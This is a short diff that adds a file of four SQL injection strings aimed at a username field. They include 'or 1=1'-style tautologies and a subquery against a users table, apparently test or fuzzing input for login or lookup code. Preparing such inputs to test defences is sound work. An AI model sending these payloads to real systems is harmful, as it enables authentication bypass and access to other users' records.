@@ -1,0 +1,4 @@
+user3' or username = 'xx
+user3' or id = (select "users"."id" from "users" desc limit 1) or username = 'xx
+user3' or id = '5
+xx' or '1' = '1
